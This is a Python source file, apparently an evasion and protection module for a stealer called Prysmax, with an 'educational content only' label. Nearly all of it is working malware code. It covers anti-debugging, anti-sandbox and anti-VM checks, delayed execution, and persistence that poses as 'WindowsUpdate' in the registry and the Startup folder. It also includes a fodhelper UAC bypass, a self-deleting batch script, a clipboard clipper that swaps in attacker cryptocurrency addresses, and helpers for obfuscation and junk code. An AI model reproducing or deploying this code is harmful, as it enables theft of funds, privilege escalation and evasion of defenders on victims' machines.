#!/usr/bin/env python3
"""
Prysmax Protection & Evasion Module
Educational content only
"""

import os
import sys
import time
import ctypes
import subprocess
import threading
from pathlib import Path

try:
    import winreg
    WINREG_AVAILABLE = True
except ImportError:
    WINREG_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

class ProtectionManager:
    def __init__(self, config):
        self.config = config
        self.protection_features = config.get("stealer", {}).get("features", {})
        
    def apply_protections(self):
        """Apply all enabled protection features"""
        try:
            if self.protection_features.get("anti_debug", False):
                self.enable_anti_debug()
            
            if self.protection_features.get("startup", False):
                self.enable_persistence()
            
            if self.protection_features.get("uac_bypass", False):
                self.attempt_uac_bypass()
            
            if self.protection_features.get("melt", False):
                self.enable_self_destruct()
                
        except Exception as e:
            print(f"[PROTECTION] Error applying protections: {e}")
    
    def enable_anti_debug(self):
        """Enable anti-debugging techniques"""
        try:
            # Check for debuggers
            if self.is_debugger_present():
                print("[PROTECTION] Debugger detected, exiting")
                sys.exit(1)
            
            # Start anti-debug monitoring thread
            debug_thread = threading.Thread(target=self.monitor_debuggers, daemon=True)
            debug_thread.start()
            
        except Exception as e:
            print(f"[PROTECTION] Anti-debug error: {e}")
    
    def is_debugger_present(self):
        """Check for various debugging indicators"""
        try:
            if os.name == 'nt':
                # Windows-specific checks
                kernel32 = ctypes.windll.kernel32
                
                # IsDebuggerPresent
                if kernel32.IsDebuggerPresent():
                    return True
                
                # CheckRemoteDebuggerPresent
                debug_flag = ctypes.c_bool()
                if kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(debug_flag)):
                    if debug_flag.value:
                        return True
            
            # Check for common debugger processes
            if PSUTIL_AVAILABLE:
                debugger_processes = [
                    'ollydbg.exe', 'x64dbg.exe', 'x32dbg.exe', 'windbg.exe',
                    'ida.exe', 'ida64.exe', 'idaq.exe', 'idaq64.exe',
                    'cheatengine.exe', 'processhacker.exe', 'procmon.exe'
                ]
                
                for proc in psutil.process_iter(['name']):
                    try:
                        if proc.info['name'].lower() in debugger_processes:
                            return True
                    except:
                        pass
            
            return False
            
        except Exception as e:
            return False
    
    def monitor_debuggers(self):
        """Continuously monitor for debuggers"""
        while True:
            try:
                if self.is_debugger_present():
                    os._exit(1)
                time.sleep(5)
            except:
                break
    
    def enable_persistence(self):
        """Enable startup persistence"""
        try:
            if not WINREG_AVAILABLE:
                return
            
            exe_path = sys.executable if hasattr(sys, 'frozen') else __file__
            
            # Registry persistence
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                                   0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
                winreg.CloseKey(key)
                print("[PROTECTION] Registry persistence enabled")
            except Exception as e:
                print(f"[PROTECTION] Registry persistence failed: {e}")
            
            # Startup folder persistence
            try:
                startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
                if os.path.exists(startup_folder):
                    import shutil
                    startup_file = os.path.join(startup_folder, "WindowsUpdate.exe")
                    shutil.copy2(exe_path, startup_file)
                    print("[PROTECTION] Startup folder persistence enabled")
            except Exception as e:
                print(f"[PROTECTION] Startup folder persistence failed: {e}")
                
        except Exception as e:
            print(f"[PROTECTION] Persistence error: {e}")
    
    def attempt_uac_bypass(self):
        """Attempt UAC bypass techniques"""
        try:
            if os.name != 'nt':
                return
            
            # Check if already elevated
            if ctypes.windll.shell32.IsUserAnAdmin():
                print("[PROTECTION] Already running with admin privileges")
                return
            
            # Attempt UAC bypass using fodhelper
            try:
                exe_path = sys.executable if hasattr(sys, 'frozen') else __file__
                
                # Create registry entries for fodhelper bypass
                key_path = r"SOFTWARE\Classes\ms-settings\Shell\Open\command"
                
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, exe_path)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                winreg.CloseKey(key)
                
                # Execute fodhelper
                subprocess.Popen("C:\\Windows\\System32\\fodhelper.exe", shell=True)
                
                # Clean up registry
                time.sleep(3)
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                
                print("[PROTECTION] UAC bypass attempted")
                
            except Exception as e:
                print(f"[PROTECTION] UAC bypass failed: {e}")
                
        except Exception as e:
            print(f"[PROTECTION] UAC bypass error: {e}")
    
    def enable_self_destruct(self):
        """Enable self-destruct after execution"""
        try:
            def self_destruct():
                time.sleep(60)  # Wait 1 minute after execution
                try:
                    exe_path = sys.executable if hasattr(sys, 'frozen') else __file__
                    
                    # Create batch file to delete executable
                    batch_content = f'''
@echo off
timeout /t 2 /nobreak > nul
del /f /q "{exe_path}"
del /f /q "%~f0"
'''
                    
                    batch_path = os.path.join(os.environ['TEMP'], 'cleanup.bat')
                    with open(batch_path, 'w') as f:
                        f.write(batch_content)
                    
                    # Execute batch file
                    subprocess.Popen(batch_path, shell=True)
                    
                except Exception as e:
                    print(f"[PROTECTION] Self-destruct error: {e}")
            
            # Start self-destruct thread
            destruct_thread = threading.Thread(target=self_destruct, daemon=True)
            destruct_thread.start()
            
            print("[PROTECTION] Self-destruct enabled")
            
        except Exception as e:
            print(f"[PROTECTION] Self-destruct setup error: {e}")

class AntiAnalysis:
    """Anti-analysis and sandbox evasion techniques"""
    
    @staticmethod
    def is_sandbox():
        """Detect if running in a sandbox environment"""
        try:
            sandbox_indicators = []
            
            # Check for VM artifacts
            vm_files = [
                r"C:\windows\system32\drivers\vmmouse.sys",
                r"C:\windows\system32\drivers\vmhgfs.sys",
                r"C:\windows\system32\drivers\VBoxMouse.sys",
                r"C:\windows\system32\drivers\VBoxGuest.sys",
                r"C:\windows\system32\drivers\VBoxSF.sys",
                r"C:\windows\system32\vboxdisp.dll",
                r"C:\windows\system32\vboxhook.dll",
                r"C:\windows\system32\vboxoglerrorspu.dll"
            ]
            
            for file_path in vm_files:
                if os.path.exists(file_path):
                    sandbox_indicators.append(f"VM file found: {file_path}")
            
            # Check for VM processes
            if PSUTIL_AVAILABLE:
                vm_processes = [
                    'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe',
                    'vboxservice.exe', 'vboxtray.exe', 'sandboxiedcomlaunch.exe',
                    'sandboxierpcss.exe', 'procmon.exe', 'regmon.exe',
                    'filemon.exe', 'wireshark.exe', 'netmon.exe'
                ]
                
                for proc in psutil.process_iter(['name']):
                    try:
                        if proc.info['name'].lower() in vm_processes:
                            sandbox_indicators.append(f"VM process found: {proc.info['name']}")
                    except:
                        pass
            
            # Check system specs (VMs often have low specs)
            if PSUTIL_AVAILABLE:
                memory = psutil.virtual_memory()
                if memory.total < 2 * 1024 * 1024 * 1024:  # Less than 2GB RAM
                    sandbox_indicators.append("Low RAM detected")
                
                if psutil.cpu_count() < 2:
                    sandbox_indicators.append("Low CPU count detected")
            
            # Check for common sandbox usernames
            username = os.getenv('USERNAME', '').lower()
            sandbox_users = ['sandbox', 'malware', 'virus', 'sample', 'test']
            if any(user in username for user in sandbox_users):
                sandbox_indicators.append(f"Sandbox username: {username}")
            
            return len(sandbox_indicators) >= 2, sandbox_indicators
            
        except Exception as e:
            return False, [f"Error checking sandbox: {e}"]
    
    @staticmethod
    def delay_execution():
        """Delay execution to evade dynamic analysis"""
        try:
            # Sleep for random time between 30-120 seconds
            import random
            delay = random.randint(30, 120)
            print(f"[PROTECTION] Delaying execution for {delay} seconds")
            time.sleep(delay)
            
        except Exception as e:
            print(f"[PROTECTION] Delay error: {e}")
    
    @staticmethod
    def check_mouse_movement():
        """Check for mouse movement to detect human interaction"""
        try:
            if os.name != 'nt':
                return True
            
            import ctypes
            from ctypes import wintypes
            
            # Get initial cursor position
            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
            
            point = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(point))
            initial_pos = (point.x, point.y)
            
            # Wait and check if mouse moved
            time.sleep(10)
            ctypes.windll.user32.GetCursorPos(ctypes.byref(point))
            final_pos = (point.x, point.y)
            
            moved = initial_pos != final_pos
            print(f"[PROTECTION] Mouse movement detected: {moved}")
            return moved
            
        except Exception as e:
            print(f"[PROTECTION] Mouse check error: {e}")
            return True

class CryptoClipper:
    """Cryptocurrency address clipper"""
    
    def __init__(self, addresses):
        self.addresses = addresses
        self.monitoring = False
        
    def start_monitoring(self):
        """Start clipboard monitoring"""
        try:
            if os.name != 'nt':
                return
            
            self.monitoring = True
            monitor_thread = threading.Thread(target=self._monitor_clipboard, daemon=True)
            monitor_thread.start()
            print("[CLIPPER] Clipboard monitoring started")
            
        except Exception as e:
            print(f"[CLIPPER] Error starting monitor: {e}")
    
    def _monitor_clipboard(self):
        """Monitor clipboard for crypto addresses"""
        try:
            import win32clipboard
            import win32con
            
            last_clipboard = ""
            
            while self.monitoring:
                try:
                    win32clipboard.OpenClipboard()
                    clipboard_data = win32clipboard.GetClipboardData(win32con.CF_TEXT)
                    win32clipboard.CloseClipboard()
                    
                    if clipboard_data != last_clipboard:
                        last_clipboard = clipboard_data
                        replacement = self._get_replacement_address(clipboard_data)
                        
                        if replacement:
                            self._set_clipboard(replacement)
                            print(f"[CLIPPER] Replaced address: {clipboard_data[:10]}... -> {replacement[:10]}...")
                    
                except:
                    pass
                
                time.sleep(0.5)
                
        except Exception as e:
            print(f"[CLIPPER] Monitor error: {e}")
    
    def _get_replacement_address(self, text):
        """Get replacement address for detected crypto address"""
        try:
            text = text.strip()
            
            # Bitcoin address patterns
            if len(text) >= 26 and len(text) <= 35 and (text.startswith('1') or text.startswith('3')):
                return self.addresses.get('bitcoin', text)
            
            # Ethereum address pattern
            if len(text) == 42 and text.startswith('0x'):
                return self.addresses.get('ethereum', text)
            
            # Litecoin address pattern
            if len(text) >= 26 and len(text) <= 35 and (text.startswith('L') or text.startswith('M')):
                return self.addresses.get('litecoin', text)
            
            return None
            
        except Exception as e:
            return None
    
    def _set_clipboard(self, text):
        """Set clipboard content"""
        try:
            import win32clipboard
            import win32con
            
            win32clipboard.OpenClipboard()
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardData(win32con.CF_TEXT, text)
            win32clipboard.CloseClipboard()
            
        except Exception as e:
            print(f"[CLIPPER] Set clipboard error: {e}")

class FileObfuscator:
    """File obfuscation and packing utilities"""
    
    @staticmethod
    def obfuscate_strings(code):
        """Simple string obfuscation"""
        try:
            import base64
            
            # Find string literals and encode them
            lines = code.split('\n')
            obfuscated_lines = []
            
            for line in lines:
                if '"' in line or "'" in line:
                    # Simple base64 encoding of strings
                    import re
                    
                    def encode_string(match):
                        string_content = match.group(1)
                        encoded = base64.b64encode(string_content.encode()).decode()
                        return f'base64.b64decode("{encoded}").decode()'
                    
                    line = re.sub(r'"([^"]*)"', encode_string, line)
                    line = re.sub(r"'([^']*)'", encode_string, line)
                
                obfuscated_lines.append(line)
            
            return '\n'.join(obfuscated_lines)
            
        except Exception as e:
            print(f"[OBFUSCATOR] Error: {e}")
            return code
    
    @staticmethod
    def add_junk_code(code):
        """Add junk code to confuse analysis"""
        try:
            junk_functions = [
                "def _junk_func_1(): pass",
                "def _junk_func_2(): return 42",
                "def _junk_func_3(): x = [1,2,3]; return sum(x)",
                "_junk_var_1 = 'dummy_string'",
                "_junk_var_2 = [i for i in range(100)]",
                "_junk_var_3 = {'key': 'value'}"
            ]
            
            import random
            selected_junk = random.sample(junk_functions, 3)
            
            return '\n'.join(selected_junk) + '\n\n' + code
            
        except Exception as e:
            return code

